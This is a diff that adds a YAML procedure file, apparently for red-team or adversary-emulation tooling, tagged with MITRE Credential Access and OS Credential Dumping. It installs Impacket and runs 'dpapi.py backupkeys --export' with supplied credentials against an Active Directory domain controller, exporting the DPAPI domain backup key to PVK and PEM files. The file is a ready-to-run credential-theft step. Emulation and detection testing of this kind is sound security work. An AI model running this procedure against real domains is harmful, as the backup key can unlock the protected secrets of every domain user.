@@ -1,0 +1,55 @@
+---
+api_version: 2.0
+uuid: f7e4a119-a209-4231-b1b1-8e7e35f8e95e
+name: Retrieve DPAPI Backup Key from Domain Controller
+authors:
+  - isaac_fletcher
+description: |
+  Retrieves the DPAPI domain backup key from a Domain Controller over RPC using
+  Impacket's dpapi.py. The backup key is fetched via the MS-LSAD
+  LsarRetrievePrivateData RPC call and exported to PVK and PEM files on disk.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1003 OS Credential Dumping
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: output_dir
+    description: Directory to store the exported backup key files
+    default: /tmp/dpapi_backup_key
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: retrieve_backup_key
+    description: Retrieve the DPAPI domain backup key from the DC via MS-LSAD RPC
+    inline: |
+      mkdir -p '{{.Args.output_dir}}'
+      cd '{{.Args.output_dir}}'
+
+      echo "Retrieving DPAPI backup key from {{.Args.dc}}"
+      dpapi.py backupkeys --export \
+        -t '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.dc}}'
+
+      echo "Exported backup key files:"
+      ls -la '{{.Args.output_dir}}'
+    cleanup:
+      inline: |
+        rm -rf '{{.Args.output_dir}}'
